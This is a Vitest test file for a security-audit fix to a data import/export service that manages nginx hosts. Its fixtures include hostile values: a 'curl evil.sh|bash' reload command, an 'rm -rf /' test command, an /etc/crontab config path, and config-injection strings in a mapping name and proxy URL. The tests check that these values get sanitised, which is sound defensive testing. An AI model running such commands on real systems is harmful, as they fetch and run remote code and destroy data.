import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { exportData, importData } from '@main/services/dataTransfer'
import { openDb, closeDb, __setDbPathForTest } from '@main/db/connection'

/**
 * 安全审计修复（第十一批）的测试：
 * H1 importData 校验（reloadCmd 重置/非法 mapping 跳过/密码拒收）
 * H2 mapping.name 注入消毒（conf 生成层，renderers 测试覆盖；这里测 DB 层 name 可含换行但 conf 层已消毒）
 * M1 exportData 剔除 passwordEncrypted
 */
describe('安全审计：importData 消毒', () => {
  let dir: string
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'sec-audit-'))
    __setDbPathForTest(join(dir, 'test.db'))
    openDb()
  })
  afterEach(() => {
    closeDb()
    rmSync(dir, { recursive: true, force: true })
  })

  it('H1: 恶意 reloadCmd 被重置为默认（防远程 RCE）', () => {
    const r = importData({
      version: 2,
      hosts: [{
        id: 'h1', name: 'evil', type: 'remote', isDefault: 1,
        remoteConfig: {
          host: '1.2.3.4', port: 22, username: 'root', authType: 'password',
          passwordEncrypted: 'ss1:xxxx',
          reloadCmd: 'curl evil.sh|bash',   // 恶意命令
          testCmd: 'rm -rf /',
          nginxPath: '/tmp/evil.sh', confPath: '/etc/crontab',
        },
        status: 'unknown', createdAt: 0,
      }],
      mappings: [],
    })
    expect(r.hostsImported).toBe(1)
    const exported = exportData()
    const rc = exported.hosts[0].remoteConfig!
    expect(rc.reloadCmd).toBe('nginx -s reload')   // 重置为默认
    expect(rc.testCmd).toBe('nginx -t')
    expect(rc.nginxPath).toBe('/usr/sbin/nginx')
    expect(rc.confPath).toBe('/etc/nginx/nginx.conf')
  })

  it('H1+M1: 导入的密码密文被拒收，导出也不带密码', () => {
    importData({
      version: 2,
      hosts: [{
        id: 'h1', name: 'x', type: 'remote', isDefault: 1,
        remoteConfig: { host: '1.2.3.4', port: 22, username: 'root', passwordEncrypted: 'ss1:leak' },
        status: 'unknown', createdAt: 0,
      }],
      mappings: [],
    })
    const exported = exportData()
    expect(exported.hosts[0].remoteConfig?.passwordEncrypted).toBeNull()
  })

  it('M1: exportData 永不导出 passwordEncrypted', () => {
    importData({
      version: 2,
      hosts: [{
        id: 'h1', name: 'x', type: 'remote', isDefault: 1,
        remoteConfig: { host: '1.2.3.4', port: 22, username: 'root', passwordEncrypted: 'ss1:secret' },
        status: 'unknown', createdAt: 0,
      }],
      mappings: [],
    })
    const out = exportData()
    expect(out.hosts[0].remoteConfig?.passwordEncrypted).toBeNull()
    expect(JSON.stringify(out)).not.toContain('secret')
  })

  it('H1: 非法 protocol 的 mapping 被跳过并计数', () => {
    const r = importData({
      version: 2,
      hosts: [{ id: 'h1', name: 'x', type: 'local', isDefault: 1, localConfig: null, remoteConfig: null, status: 'unknown', createdAt: 0 }],
      mappings: [
        { id: 'm1', hostId: 'h1', name: 'ok', enabled: 1, protocol: 'tcp', upstreamHost: '1.1.1.1', upstreamPort: 80 },
        { id: 'm2', hostId: 'h1', name: 'bad-proto', enabled: 1, protocol: 'ftp', upstreamHost: '1.1.1.1', upstreamPort: 80 },
        { id: 'm3', hostId: 'h1', name: 'bad-port', enabled: 1, protocol: 'tcp', upstreamHost: '1.1.1.1', upstreamPort: 99999 },
      ],
    })
    expect(r.mappingsImported).toBe(1)
    expect(r.mappingsSkipped).toBe(2)
  })

  it('H1: mapping.name 的换行注入被消毒（DB 落库即清洗）', () => {
    importData({
      version: 2,
      hosts: [{ id: 'h1', name: 'x', type: 'local', isDefault: 1, localConfig: null, remoteConfig: null, status: 'unknown', createdAt: 0 }],
      mappings: [
        { id: 'm1', hostId: 'h1', name: 'evil\n server { listen 8080; }', enabled: 1, protocol: 'tcp', upstreamHost: '1.1.1.1', upstreamPort: 80 },
      ],
    })
    const out = exportData()
    expect(out.mappings[0].name).not.toContain('\n')
    expect(out.mappings[0].name).not.toContain('{')
  })

  it('H1: 非法 proxyPassUrl 被拒为 null（不走透传）', () => {
    importData({
      version: 2,
      hosts: [{ id: 'h1', name: 'x', type: 'local', isDefault: 1, localConfig: null, remoteConfig: null, status: 'unknown', createdAt: 0 }],
      mappings: [
        { id: 'm1', hostId: 'h1', name: 'x', enabled: 1, protocol: 'http', upstreamHost: '1.1.1.1', upstreamPort: 80, proxyPassUrl: 'http://evil/; } server {' },
      ],
    })
    const out = exportData()
    expect(out.mappings[0].proxyPassUrl).toBeNull()
  })

  it('H1: hostId 悬空的 mapping 被跳过', () => {
    const r = importData({
      version: 2,
      hosts: [],
      mappings: [
        { id: 'm1', hostId: 'ghost', name: 'x', enabled: 1, protocol: 'tcp', upstreamHost: '1.1.1.1', upstreamPort: 80 },
      ],
    })
    expect(r.mappingsImported).toBe(0)
    expect(r.mappingsSkipped).toBe(1)
  })

  it('正常数据导入不受影响（回归）', () => {
    const r = importData({
      version: 2,
      hosts: [{ id: 'h1', name: '正常', type: 'remote', isDefault: 1, remoteConfig: { host: '10.0.0.1', port: 22, username: 'admin', passwordEncrypted: null, reloadCmd: 'nginx -s reload', testCmd: 'nginx -t' }, localConfig: null, status: 'unknown', createdAt: 0 }],
      mappings: [
        { id: 'm1', hostId: 'h1', name: 'GitLab', enabled: 1, protocol: 'http', listenPort: 20080, upstreamHost: '27.196.154.94', upstreamPort: 80, proxyPassUrl: 'http://27.196.154.94/' },
      ],
    })
    expect(r.hostsImported).toBe(1)
    expect(r.mappingsImported).toBe(1)
    expect(r.hostsSkipped).toBe(0)
    const out = exportData()
    expect(out.mappings[0].proxyPassUrl).toBe('http://27.196.154.94/')
    expect(out.hosts[0].remoteConfig?.host).toBe('10.0.0.1')
  })
})
